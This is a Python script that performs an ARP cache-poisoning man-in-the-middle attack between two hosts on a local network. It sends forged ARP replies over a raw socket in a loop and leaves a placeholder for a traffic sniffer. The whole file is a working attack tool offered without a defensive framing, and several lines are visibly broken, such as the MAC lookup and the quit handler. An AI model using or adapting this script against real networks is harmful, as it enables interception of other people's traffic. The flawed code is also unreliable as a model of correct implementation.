from time import sleep
from threading import Thread
from struct import *
import subprocess
import socket
import sys
import os
import re


# ARPs for the mac address of an IP
def get_mac(ip):
	mac = str(subprocess.check_output(['arping', '-f', ip]))
	mac = re.search('([0-9A-F]{2}[:]){5}([0-9A-F]{2})', mac).group(0)
	return pack('!6B', *[int(x, 16) for x in mac.split(':')])

# Prompts for host IP's
ip1 = pack('!4B', *[int(x) for x in input("Host1's IP: ").split('.')])
ip2 = pack('!4B', *[int(x) for x in input("Host2's IP: ").split('.')])

# ARPs for host mac addresses
mac1 = get_mac(ip1)
mac2 = get_mac(ip2)

# Sets up socket to send ARP reply
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
print(os.system('ifconfig'))
net_device = input("Select network device: ")
s.bind((net_device, socket.SOCK_RAW))

# This computers mac address
my_mac = s.getsockname()[4]

# Creates an arp packet
def make_arp(target_ip, target_mac, sender_ip, sender_mac):
	arp_packet = [
		# Ethernet Header
		target_mac,  # Destination mac address
		my_mac,  # sender_mac,#Source mac address
		pack('>H', 0x0806),  # Protocol type (ARP = 0x0806)

		# ARP Header
		pack('>H', 0x0001),  # Hardware type (Ethernet(10 Mb) = 1)
		pack('>H', 0x0800),  # Protocol type (IP = 0x0800)
		pack('>B', 0x06),  # Mac address length
		pack('>B', 0x04),  # Ip address length
		pack('>H', 0x0002),  # Opcode (ARP reply = 2)
		sender_mac,  # Sender mac address
		sender_ip,  # Sender ip address
		target_mac,  # Target mac address
		target_ip  # Target ip address
	]
	return b''.join(arp_packet)

# Creates the two malicious ARP packets
arp1 = make_arp(ip1, mac1, ip2, my_mac)
arp2 = make_arp(ip2, mac2, ip1, my_mac)

# Starts the man in the middle attack
def poison_arp():
	s.send(arp1)
	s.send(arp2)

# Ends the man in the middle attack quietly
def restore_connection():
	arp1 = make_arp(ip1, mac1, ip2, mac2)
	arp2 = make_arp(ip2, mac2, ip1, mac1)
	s.send(arp1)
	s.send(arp2)

# Boolean to determine when to stop attacking
attacking = True

# Used to end the attack
def poll_console(self):
	input("Type q to quit...")
	self.attacking = False

# Starts the man in the middle attack
Thread(target=poll_console).start()
# TODO start sniffer here
while attacking:
	poison_arp()
	sleep(500)
restore_connection()
